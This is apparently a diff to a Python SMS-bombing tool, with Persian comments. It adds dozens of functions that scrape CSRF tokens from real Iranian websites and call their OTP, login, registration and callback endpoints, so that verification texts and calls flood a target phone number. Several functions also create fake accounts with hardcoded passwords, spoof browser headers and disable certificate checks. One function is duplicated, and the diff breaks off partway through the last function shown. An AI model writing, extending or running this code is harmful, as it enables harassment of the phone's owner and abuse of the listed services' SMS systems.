@@ -70,6 +70,1586 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+def padmira(phone):  
+    phone = phone.strip()
+    if phone.startswith("+98"): phone = "0" + phone[3:]
+    elif phone.startswith("98") and len(phone) == 12: phone = "0" + phone[2:]
+
+    session = requests.Session()
+    home_url = "https://padmira.ir/"
+    headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,*/*"}
+
+    try: 
+        res = session.get(home_url, headers=headers, timeout=10)
+        soup = BeautifulSoup(res.text, "html.parser")
+        csrf_tag = soup.find("meta", {"name": "csrf-token"}) or soup.find("input", {"name": "_token"})
+        if not csrf_tag: return {"error": "CSRF token پیدا نشد!"}
+        csrf_token = csrf_tag.get("content") if csrf_tag.has_attr("content") else csrf_tag.get("value")
+        ajax_url = home_url + "ajax/send_sms_active"
+        headers.update({
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-CSRF-TOKEN": csrf_token,
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": home_url,
+            "Referer": home_url,
+        })
+        res2 = session.post(ajax_url, headers=headers, data={"mobile": phone}, timeout=10)
+
+        try:
+            return res2.json()
+        except:
+            return {"response_text": res2.text}
+
+    except Exception as e:
+        return {"error": str(e)}
+        
+        
+def bornosmode(phone):
+    phone = phone.strip()
+    if phone.startswith("+98"):
+        phone = "0" + phone[3:]
+    elif phone.startswith("98") and len(phone) == 12:
+        phone = "0" + phone[2:]
+
+    session = requests.Session()
+    home_url = "https://bornosmode.com/"
+
+    try:
+        res = session.get(home_url, timeout=10)
+        soup = BeautifulSoup(res.text, "html.parser")
+        meta_tag = soup.find("meta", {"name": "csrf-token"})
+        if not meta_tag:
+            return "[-] CSRF Token پیدا نشد!"
+        csrf_token = meta_tag.get("content")
+        print(f"[+] CSRF Token: {csrf_token}")
+    except Exception as e:
+        return f"[-] خطا در دریافت توکن: {e}"
+
+    url = "https://bornosmode.com/api/loginRegister/"
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "*/*",
+        "X-CSRF-TOKEN": csrf_token,
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "https://bornosmode.com",
+        "Referer": "https://bornosmode.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    }
+    data = {
+        "mobile": phone,
+        "withOtp": "1"
+    }
+
+    try:
+        res2 = session.post(url, headers=headers, data=data, timeout=10)
+        try:
+            return res2.json()
+        except:
+            return res2.text
+    except Exception as e:
+        return f"[-] خطا در ارسال OTP: {e}"
+
+
+
+def chapmatin(phone):
+    try:
+        session = requests.Session()
+        home_url = "https://www.chapmatin.com/"
+        r = session.get(home_url, timeout=10, verify=False)
+        soup = BeautifulSoup(r.text, "html.parser")
+
+        dig_nounce = next((i.get("value") for i in soup.find_all("input") if i.get("name") == "dig_nounce"), None)
+        if not dig_nounce:
+            print("[-] توکن پیدا نشد ❌")
+            return False
+
+        data = {
+            'action': 'digits_check_mob',
+            'countrycode': '+98',
+            'mobileNo': phone.replace('+98', ''),
+            'csrf': dig_nounce,              # همون توکن رو تو csrf هم می‌ذاره
+            'login': '2',
+            'digits': '1',
+            'json': '1',
+            'whatsapp': '0',
+            'digregcode': '+98',
+            'digits_reg_mail': phone.replace('+98', ''),
+            'digits_reg_password': 'admin123Mm@0091!',
+            'dig_nounce': dig_nounce
+        }
+
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': home_url,
+            'User-Agent': 'Mozilla/5.0'
+        }
+
+        res = session.post(home_url + "wp-admin/admin-ajax.php", data=data, headers=headers, timeout=10, verify=False)
+        result = res.json() if res.headers.get("Content-Type", "").startswith("application/json") else {}
+
+        if str(result.get("code")) == "1" or result.get("success"):
+            print("[+] کد ارسال شد ✅")
+            return True
+        else:
+            print(f"[-] خطا: {result}")
+            return False
+
+    except Exception as e:
+        print(f"[!] خطا در Chapmatin: {e}")
+        return False
+
+
+def mohrpegah(phone):
+    try:
+        session = requests.Session()
+        home_url = "https://mohrpegah.com/"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        }
+        
+        response = session.get(home_url, headers=headers, timeout=10, verify=False)
+        soup = BeautifulSoup(response.text, "html.parser")
+
+        dig_nounce = None
+        for inp in soup.find_all("input"):
+            if inp.get("name") == "dig_nounce":
+                dig_nounce = inp.get("value")
+
+        if not dig_nounce:
+            print("[-] توکن dig_nounce پیدا نشد ❌")
+            return False
+
+        csrf = dig_nounce  # هر دو یکی هستند
+
+        print(f"[+] CSRF: {csrf}")
+        print(f"[+] Dig Nounce: {dig_nounce}")
+
+        url = "https://mohrpegah.com/wp-admin/admin-ajax.php"
+        data = {
+            "action": "digits_check_mob",
+            "countrycode": "+98",
+            "mobileNo": phone.replace("+98", ""),
+            "csrf": csrf,
+            "login": "1",
+            "username": "",
+            "email": "",
+            "captcha": "",
+            "captcha_ses": "",
+            "digits": "1",
+            "json": "1",
+            "whatsapp": "0",
+            "mobmail": phone,
+            "dig_otp": "",
+            "dig_nounce": dig_nounce,
+            "wp-submit": "1"
+        }
+        headers["X-Requested-With"] = "XMLHttpRequest"
+        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+        headers["Origin"] = home_url
+        headers["Referer"] = home_url
+
+        res = session.post(url, data=data, headers=headers, timeout=10, verify=False)
+
+        print(f"Status: {res.status_code}")
+        print(f"Response: {res.text}")
+
+        if res.status_code == 200 and '"code":"1"' in res.text:
+            print("[+] mohrpegah: کد ارسال شد ✅")
+            return True
+        else:
+            print("[-] mohrpegah: خطا در ارسال ❌")
+            return False
+
+    except Exception as e:
+        print(f"[!] خطا: {e}")
+        return False
+
+
+
+def toorangco(phone):
+    try:
+        phone_number = phone.replace("+98", "0").replace("98", "0")
+        url = f"https://eapi.toorangco.com/api/CheckUserMobile/{phone_number}/1"
+
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                          "AppleWebKit/537.36 (KHTML, like Gecko) "
+                          "Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Origin": "https://toorangco.com",
+            "Referer": "https://toorangco.com/",
+        }
+
+        response = requests.get(url, headers=headers, timeout=10, verify=False)
+
+        print(f"Status Code: {response.status_code}")
+        print(f"Raw Response: {response.text.strip()}")
+
+        if response.status_code == 200:
+            try:
+                result = response.json()
+                if result is True or \
+                   str(result).lower() == "true" or \
+                   result.get("success") or \
+                   result.get("exists"):
+                    print(f"{g}[+] ToorangCo: کد ارسال شد ✅{a}")
+                    return True
+                else:
+                    print(f"{y}[-] ToorangCo: پاسخ معتبر ولی ناموفق - {result}{a}")
+                    return False
+            except ValueError:
+                if "true" in response.text.lower():
+                    print(f"{g}[+] ToorangCo: کد ارسال شد ✅{a}")
+                    return True
+                else:
+                    print(f"{y}[-] ToorangCo: پاسخ متنی نامعتبر{a}")
+                    return False
+        else:
+            print(f"{r}[-] ToorangCo: خطای سرور {response.status_code}{a}")
+            return False
+
+    except requests.exceptions.RequestException as e:
+        print(f"{r}[!] خطای شبکه در ToorangCo: {e}{a}")
+        return False
+    except Exception as e:
+        print(f"{r}[!] خطای عمومی در ToorangCo: {e}{a}")
+        return False
+        
+        
+def irankohan(phone):
+    try:
+        import requests, random, string
+        session = requests.Session()
+        home_url = "https://irankohan.ir/Register/Register"
+        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
+        session.get(home_url, headers=headers, timeout=10, verify=False)
+
+        name = "احمد مروت"
+        email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@yahoo.com"
+        password = "admin123@Mm"
+
+        data = {
+            'returnUrl':'','CompanyName':'','Name':name,
+            'Mobile': phone.replace('+98','0'),
+            'Email': email,'Password': password,'ConfirmPassword': password,
+            'X-Requested-With':'XMLHttpRequest'
+        }
+
+        headers.update({
+            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+            'Accept':'*/*','X-Requested-With':'XMLHttpRequest',
+            'Origin':'https://irankohan.ir','Referer':home_url
+        })
+
+        r = session.post(home_url, data=data, headers=headers, timeout=10, verify=False)
+        print(f"Status: {r.status_code}, Response: {r.text}")
+
+        if r.status_code == 200:
+            try:
+                result = r.json()
+                if ("ثبت" in result.get("alarm","") or "ذخیره گردید" in result.get("alarm","")):
+                    print(f"{g}[+] IranKohan: ثبت نام موفق / کد ارسال شد!{a}")
+                    return True
+                else:
+                    print(f"{y}[-] IranKohan: خطا - {result}{a}")
+                    return False
+            except:
+                if 'ثبت' in r.text or 'success' in r.text.lower():
+                    print(f"{g}[+] IranKohan: ثبت نام موفق!{a}")
+                    return True
+                return False
+        print(f"{r}[-] IranKohan: خطای سرور {r.status_code}{a}")
+        return False
+
+    except Exception as e:
+        print(f"{r}[!] خطا در IranKohan: {e}{a}")
+        return False
+        
+
+
+def teamgraphic(phone):
+    try:
+        import requests, random, string
+        session = requests.Session()
+        signup_url = "https://teamgraphic.ir/users/sign-up"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+        }
+        session.get(signup_url, headers=headers, timeout=10, verify=False)
+
+        random_name = ''.join(random.choices(string.ascii_letters, k=6)) + " " + ''.join(random.choices(string.ascii_letters, k=6))
+        data_signup = {
+            'UsersInfo[name]': random_name,
+            'UsersInfo[mobile]': phone.replace('+98', '0'),
+            'UsersInfo[password]': 'admin123Mm@',
+            'UsersInfo[phone]': '',
+            'UsersInfo[method_acquainting]': 'سایت',
+            'UsersInfo[law]': '1'
+        }
+        headers.update({'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                        'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://teamgraphic.ir', 'Referer': signup_url})
+
+        r_signup = session.post(signup_url, data=data_signup, headers=headers, timeout=10, verify=False)
+        run_signin = False
+
+        try:
+            res_signup = r_signup.json()
+            if res_signup.get("success") or res_signup.get("status") == "success":
+                print(f"[+] TeamGraphic: ثبت نام موفق ✅")
+                run_signin = True
+            elif 'کاربری با این نام کاربری قبلاً ثبت شده' in str(res_signup.get("msg", "")):
+                print(f"[!] TeamGraphic: نام کاربری موجود، مرحله ارسال کد اجرا می‌شود")
+                run_signin = True
+            else:
+                print(f"[-] TeamGraphic: ثبت نام ناموفق - {res_signup}")
+        except:
+            if 'success' in r_signup.text.lower() or 'ارسال' in r_signup.text:
+                print(f"[+] TeamGraphic: ثبت نام موفق ✅")
+                run_signin = True
+ 
+        if run_signin:
+            signin_url = "https://teamgraphic.ir/users/sign-in"
+            data_signin = {
+                'mobile': phone.replace('+98', '0'),
+                'type': '1',
+                'ref': '',
+                'remember_me': 'false'
+            }
+            r_signin = session.post(signin_url, data=data_signin, headers=headers, timeout=10, verify=False)
+            print(f"Status Code: {r_signin.status_code}")
+            print(f"Response: {r_signin.text}")
+            if r_signin.status_code == 200 and 'success' in r_signin.text.lower():
+                print(f"[+] TeamGraphic: کد ورود ارسال شد ✅")
+                return True
+            else:
+                print(f"[-] TeamGraphic: ارسال کد ورود ناموفق")
+                return False
+        else:
+            return False
+
+    except Exception as e:
+        print(f"[!] خطا در TeamGraphic: {e}")
+        return False
+
+
+
+
+def xmohr(phone):
+    try:
+        import requests
+        session = requests.Session()
+        home_url = "https://xmohr.ir/"
+        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
+        session.get(home_url, headers=headers, timeout=10, verify=False)
+
+        url = "https://xmohr.ir/wp-admin/admin-ajax.php"
+        data = {'action': 'stm_login_register', 'type': 'mobile', 'input': phone.replace('+98', '0')}
+        headers.update({
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://xmohr.ir',
+            'Referer': home_url
+        })
+
+        r = session.post(url, data=data, headers=headers, timeout=10, verify=False)
+        print(f"Status: {r.status_code} | Response: {r.text}")
+
+        if r.status_code == 200:
+            try:
+                res = r.json()
+                if res.get("success") or res.get("status") == "success":
+                    print(f"{g}[+] XMohr: کد ارسال شد!{a}")
+                    return True
+                else:
+                    print(f"{y}[-] XMohr: خطا - {res}{a}")
+                    return False
+            except:
+                if 'success' in r.text.lower() or 'ارسال' in r.text:
+                    print(f"{g}[+] XMohr: کد ارسال شد!{a}")
+                    return True
+                print(f"{y}[-] XMohr: پاسخ نامعتبر{a}")
+                return False
+        print(f"{r}[-] XMohr: خطای سرور {r.status_code}{a}")
+        return False
+
+    except Exception as e:
+        print(f"{r}[!] خطا در XMohr: {e}{a}")
+        return False
+        
+        
+        
+def cartesabz(phone):
+    try:
+        import requests
+        session = requests.Session()
+        home_url = "https://cartesabz.net/"
+        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
+        session.get(home_url, headers=headers, timeout=10, verify=False)
+
+        url = "https://cartesabz.net/wp-admin/admin-ajax.php"
+        data_call = {'login': phone.replace('+98', '+98'), 'method': 'call', 'action': 'first_login'}
+        headers.update({
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://cartesabz.net',
+            'Referer': home_url
+        })
+
+        r_call = session.post(url, data=data_call, headers=headers, timeout=10, verify=False)
+        print(f"Call Status: {r_call.status_code} | Response: {r_call.text}")
+        if r_call.status_code == 200:
+            print(f"{g}[+] CarteSabz Call: درخواست تماس انجام شد{a}")
+        else:
+            print(f"{y}[-] CarteSabz Call: خطا {r_call.status_code}{a}")
+        data_sms = {'login': phone.replace('+98', '+98'), 'method': 'sms', 'action': 'first_login'}
+        r_sms = session.post(url, data=data_sms, headers=headers, timeout=10, verify=False)
+        print(f"SMS Status: {r_sms.status_code} | Response: {r_sms.text}")
+        if r_sms.status_code == 200:
+            print(f"{g}[+] CarteSabz SMS: کد پیامکی ارسال شد!{a}")
+            return True
+        else:
+            print(f"{y}[-] CarteSabz SMS: خطا {r_sms.status_code}{a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] خطا در CarteSabz: {e}{a}")
+        return False
+        
+
+def baldano(phone, name="رحمان"):
+    try:
+        import requests
+        from bs4 import BeautifulSoup
+        
+        session = requests.Session()
+        home_url = "https://www.baldano.ir/study/"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+        }
+        response = session.get(home_url, headers=headers, timeout=10, verify=False)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        token_input = soup.find('input', {'name': '__RequestVerificationToken'})
+        if not token_input:
+            print(f"{r}[-] Baldano: توکن پیدا نشد{a}")
+            return False
+        token = token_input['value']
+        data = {
+            'name': 'Form-Consult',
+            'RedirectUrl': '/study/',
+            'formData[0].Key': 'Name',
+            'formData[0].Value': name,
+            'formData[1].Key': 'Phone',
+            'formData[1].Value': phone.replace('+98','0'),
+            'formData[2].Key': 'country',
+            'formData[2].Value': 'همه کشورها',
+            'formData[3].Key': 'service',
+            'formData[3].Value': '',
+            'formData[4].Key': 'page',
+            'formData[4].Value': '/study/',
+            '__RequestVerificationToken': token
+        }
+        
+        headers.update({
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest'
+        })
+
+        post_url = "https://www.baldano.ir/common/asendform"
+        r = session.post(post_url, data=data, headers=headers, timeout=10, verify=False)
+        
+        print(f"Status: {r.status_code}")
+        print(f"Response: {r.text}")
+        if r.status_code == 200:
+            print(f"{g}[+] Baldano: فرم ارسال شد!{a}")
+            return True
+        else:
+            print(f"{y}[-] Baldano: خطا در ارسال{a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] خطا در Baldano: {e}{a}")
+        return False
+        
+
+def aryakalaabzar(phone):
+    try:
+        session = requests.Session()
+        home_url = "https://aryakalaabzar.ir/product-category/industrial-tools/rechargable-drill/?login=true"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            'Accept': 'text/html,application/xhtml+xml'
+        }
+        html = session.get(home_url, headers=headers, timeout=10, verify=False).text
+        match = re.search(r'name="instance_id" value="([^"]+)"', html)
+        if not match:
+            print("[-] instance_id پیدا نشد")
+            return False
+        instance_id = match.group(1)
+        url = "https://aryakalaabzar.ir/wp-admin/admin-ajax.php"
+        data = {
+            'digt_countrycode': '+98',
+            'phone': phone.replace('+98', ''),
+            'email': '',
+            'digits_reg_password': '',
+            'digits_process_register': '1',
+            'sms_otp': '',
+            'otp_step_1': '1',
+            'digits_otp_field': '1',
+            'instance_id': instance_id,
+            'optional_data': 'optional_data',
+            'action': 'digits_forms_ajax',
+            'type': 'register',
+            'dig_otp': 'otp',
+            'digits': '1',
+            'digits_redirect_page': '//aryakalaabzar.ir/product-category/industrial-tools/rechargable-drill/',
+            'digits_form': '67b93d9cf2',
+            '_wp_http_referer': '/product-category/industrial-tools/rechargable-drill/?login=true',
+            'container': 'digits_protected',
+            'sub_action': 'sms_otp'
+        }
+        headers.update({
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://aryakalaabzar.ir',
+            'Referer': home_url
+        })
+
+        r = session.post(url, data=data, headers=headers, timeout=10, verify=False)
+        print(f"[DEBUG] Status: {r.status_code}, Response: {r.text[:200]}...")
+
+        if r.status_code == 200 and '"success":true' in r.text:
+            print("[+] AryaKalaAbzar: کد ارسال شد ✅")
+            return True
+        else:
+            print("[-] AryaKalaAbzar: ارسال ناموفق ❌")
+            return False
+
+    except Exception as e:
+        print(f"[!] خطا: {e}")
+        return False
+
+
+
+def motorbargh(phone):
+    try:
+        url = "https://motorbargh.shop/wp-admin/admin-ajax.php"
+        data = {
+            "action": "stm_login_register",
+            "type": "mobile",
+            "input": phone
+        }
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+
+        response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
+
+        print(f"Status: {response.status_code}")
+        print(f"Response: {response.text}")
+
+        if response.status_code == 200:
+            try:
+                result = response.json()
+                if result.get("status") in ["success", True]:
+                    print(f"{g}[+] MotorBargh: کد ارسال شد ✔{a}")
+                    return True
+                else:
+                    print(f"{y}[-] MotorBargh: خطا - {result}{a}")
+                    return False
+            except:
+                if "success" in response.text.lower():
+                    print(f"{g}[+] MotorBargh: کد ارسال شد ✔{a}")
+                    return True
+                else:
+                    print(f"{y}[-] MotorBargh: پاسخ نامعتبر{a}")
+                    return False
+        else:
+            print(f"{r}[-] MotorBargh: خطای سرور {response.status_code}{a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] خطا در MotorBargh: {e}{a}")
+        return False
+
+def motorbargh(phone):
+    try:
+        url = "https://motorbargh.shop/wp-admin/admin-ajax.php"
+        data = {"action":"stm_login_register","type":"mobile","input":phone}
+        headers = {
+            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept":"application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With":"XMLHttpRequest",
+            "User-Agent":"Mozilla/5.0"
+        }
+
+        res = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
+        print(f"Status: {res.status_code}")
+        print(f"Response: {res.text}")
+
+        result = res.json()
+        if result.get("success") is True:
+            print(f"{g}[+] MotorBargh: کد فعالسازی برای شما ارسال شد ✔{a}")
+            return True
+        else:
+            print(f"{y}[-] MotorBargh: خطا - {result.get('text', result)}{a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] خطا در MotorBargh: {e}{a}")
+        return False
+
+
+
+def abzarmarket(phone):
+    try:
+        url = "https://abzarmarket.com/restApi/auth/register"
+        data = {
+            "form_type": "register",
+            "mobile": phone,
+            "password": "@dmin123A",
+            "tos": False,
+            "subscribe": True,
+            "redirect": "",
+            "gender": "male",
+            "first_name": "نام",
+            "last_name": "خانوادگی"
+        }
+        headers = {
+            "Content-Type": "application/json",
+            "Accept": "application/json, text/plain, */*",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+
+        response = requests.post(url, json=data, headers=headers, timeout=10)
+        print(f"Status Code: {response.status_code}")
+        print(f"Response: {response.text}")
+
+        if response.status_code == 200:
+            result = response.json()
+            if result.get("success") or result.get("message") == "کد ارسال شد":
+                print(f"[+] AbzarMarket: ثبت نام موفق / کد SMS ارسال شد!")
+                return True
+            else:
+                print(f"[-] AbzarMarket: خطا - {result}")
+                return False
+        else:
+            print(f"[-] AbzarMarket: خطای سرور {response.status_code}")
+            return False
+
+    except Exception as e:
+        print(f"[!] خطا در AbzarMarket: {e}")
+        return False
+        
+
+def three_click(phone):
+    """
+    تابع برای ارسال درخواست به API سه کلیک
+    """
+    url = "https://api.3click.com/auth/validate"
+    
+    # تبدیل +98912... به 0912...
+    normalized_phone = phone.replace("+98", "0")
+    
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "provider-code": "deltaban",
+        "Origin": "https://deltaban.3click.com",
+        "Referer": "https://deltaban.3click.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    
+    data = {
+        "mobile": normalized_phone
+    }
+    
+    try:
+        print(f"{y}[3Click] ارسال درخواست برای: {normalized_phone}{a}")
+        print(f"{y}[3Click] Headers: {json.dumps(headers, indent=2, ensure_ascii=False)}{a}")
+        print(f"{y}[3Click] Data: {json.dumps(data, ensure_ascii=False)}{a}")
+        
+        response = requests.post(
+            url=url,
+            json=data,
+            headers=headers,
+            timeout=15,
+            verify=False
+        )
+        
+        print(f"{y}[3Click] Status Code: {response.status_code}{a}")
+        print(f"{y}[3Click] Response Headers: {dict(response.headers)}{a}")
+        print(f"{y}[3Click] Response Text: {response.text}{a}")
+        
+        if response.status_code in [200, 201, 202]:
+            print(f"{g}[3Click] موفقیت‌آمیز!{a}")
+            return True
+        else:
+            print(f"{r}[3Click] خطا با کد وضعیت: {response.status_code}{a}")
+            return False
+            
+    except requests.exceptions.RequestException as e:
+        print(f"{r}[3Click] خطای ارتباطی: {e}{a}")
+        return False
+    except Exception as e:
+        print(f"{r}[3Click] خطای ناشناخته: {e}{a}")
+        return False
+
+
+def raheeno(phone):
+    try:
+        # ==== پاکسازی شماره ====
+        clean_phone = phone.strip().replace("+98", "0").replace(" ", "")
+        if not clean_phone.startswith("0"):
+            clean_phone = "0" + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print(f"[!] Raheeno: شماره نامعتبر")
+            return False
+
+        url = "https://www.raheeno.com/account/SendOneCodeSms"
+        payload = {"Mobile": clean_phone}
+        headers = {
+            "Content-Type": "application/json; charset=utf-8",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+
+        # --- بررسی نوع پاسخ ---
+        try:
+            data = response.json()
+            print(f"[DEBUG] JSON Response: {data}")
+        except ValueError:
+            data = response.text.strip()
+            print(f"[DEBUG] Text Response: {data}")
+
+        # --- بررسی نتیجه ---
+        if response.status_code == 200:
+            print("[+] Raheeno: کد ارسال شد ✅")
+            return True
+        else:
+            print(f"[-] Raheeno: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Raheeno Exception: {e}")
+        return False
+        
+
+def eavar(phone):
+    try:
+        url = "https://www.eavar.com/fa/v2/senddynamicmobilepassword/"
+        payload = {"mobile": phone}
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "X-Requested-With": "XMLHttpRequest",
+            "Content-Type": "application/json; charset=utf-8"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {data}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
+            return False
+
+        if response.status_code == 200 and data.get("success", True):
+            print("[+] Eavar: OTP ارسال شد ✅")
+            return True
+        else:
+            print(f"[-] Eavar: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Eavar Exception: {e}")
+        return False
+
+
+def t4f(phone):
+    try:
+        # شماره تلفن را پاکسازی می‌کنیم
+        clean_phone = phone.replace(" ", "").replace("+", "")
+        if clean_phone.startswith("98"):
+            clean_phone = "0" + clean_phone[2:]
+        elif not clean_phone.startswith("0"):
+            clean_phone = "0" + clean_phone
+
+        url = "https://www.t4f.ir/api/v1/auth/login"
+        payload = {"mobile": clean_phone}
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {data}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text}")
+            return False
+
+        if response.status_code == 200:
+            print("[+] T4F: OTP ارسال شد ✅")
+            return True
+        else:
+            print(f"[-] T4F: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] T4F Exception: {e}")
+        return False
+        
+def ekeepa(phone):
+    """
+    تابع برای ارسال کد تأیید به API اکیپا
+    """
+    url = "https://ekeepa.co/api/v2/site/auth/otp/send-otp"
+    
+    # تبدیل +98912... به 0912...
+    normalized_phone = phone.replace("+98", "0")
+    
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "platform": "web_customer",
+        "Origin": "https://ekeepa.co",
+        "Referer": "https://ekeepa.co/",
+        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)} Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    
+    data = {
+        "phone_number": normalized_phone
+    }
+    
+    try:
+        response = requests.post(
+            url=url,
+            json=data,
+            headers=headers,
+            timeout=15,
+            verify=False
+        )
+        
+        # چاپ پاسخ برای دیباگ
+        print(f"{y}[Ekeepa] Status: {response.status_code}, Response: {response.text}{a}")
+        
+        if response.status_code in [200, 201, 202]:
+            print(f"{g}[Ekeepa] کد تأیید ارسال شد{a}")
+            return True
+        elif response.status_code == 429:
+            print(f"{y}[Ekeepa] محدودیت ارسال (Too Many Requests){a}")
+            return False
+        else:
+            print(f"{y}[Ekeepa] خطا با کد وضعیت: {response.status_code}{a}")
+            return False
+            
+    except requests.exceptions.RequestException as e:
+        print(f"{r}[Ekeepa] خطای ارتباطی: {e}{a}")
+        return False
+    except Exception as e:
+        print(f"{r}[Ekeepa] خطای ناشناخته: {e}{a}")
+        return False
+
+
+def karnameh(phone):
+    """
+    تابع برای ارسال کد تأیید به API Karnameh
+    """
+    url = "https://api-gw.karnameh.com/switch/api/auth/otp/send/"
+    
+    # تبدیل +98912... به 0912...
+    normalized_phone = phone.replace("+98", "0")
+    
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.{random.randint(1000,9999)}.{random.randint(100,999)} Safari/537.36"
+    }
+    
+    data = {
+        "phone_number": normalized_phone
+    }
+    
+    try:
+        response = requests.post(url, json=data, headers=headers, timeout=15, verify=False)
+        print(f"{y}[Karnameh] Status: {response.status_code}, Response: {response.text}{a}")
+        
+        if response.status_code in [200, 201, 202]:
+            print(f"{g}[Karnameh] کد تأیید ارسال شد ✅{a}")
+            return True
+        elif response.status_code == 429:
+            print(f"{y}[Karnameh] محدودیت ارسال (Too Many Requests){a}")
+            return False
+        else:
+            print(f"{y}[Karnameh] خطا با کد وضعیت: {response.status_code}{a}")
+            return False
+            
+    except requests.exceptions.RequestException as e:
+        print(f"{r}[Karnameh] خطای ارتباطی: {e}{a}")
+        return False
+    except Exception as e:
+        print(f"{r}[Karnameh] خطای ناشناخته: {e}{a}")
+        return False
+
+def sheypoor(phone):
+    """
+    تابع برای ارسال کد تأیید به API شیپور
+    """
+    url = "https://www.sheypoor.com/api/v10.0.0/auth/send"
+    
+    # تبدیل +98912... به 0912...
+    normalized_phone = phone.replace("+98", "0")
+    
+    headers = {
+        "Accept": "application/json",
+        "Content-Type": "application/json;charset=utf-8",
+        "X-User-Agent": "Sheypoorx/3.6.627 browser/Mobile Safari.18.6 os/iOS.18.6",
+        "Origin": "https://www.sheypoor.com",
